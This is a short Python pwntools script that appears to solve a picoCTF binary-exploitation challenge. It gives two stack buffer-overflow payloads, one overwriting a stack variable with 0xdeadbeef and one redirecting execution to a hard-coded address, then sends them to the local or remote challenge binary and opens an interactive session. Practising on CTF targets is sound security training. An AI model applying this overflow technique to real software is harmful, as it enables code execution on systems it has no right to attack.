#!/usr/bin/env python3

# import argparse
import pwn

OFFSET_1 = 280
OFFSET_2 = 264

# ----- SOLUTION 1 ------
# Buffer overflow to overwrite variable on the stack:

payload = [
	b"A" * OFFSET_2,
	pwn.p64(0xdeadbeef, endian="little")
]

# ----- SOLUTION 2 ------
# Buffer overflow to invoke the system funciton

payload = [
	b"A" * OFFSET_1,
	pwn.p64(0x000000000040077e, endian="little")
]


file = pwn.process("./chall")
# file = pwn.remote("mars.picoctf.net", 31890)

file.recvuntil(b"What do you see?\n")
file.sendline(b"".join(payload))
file.interactive()


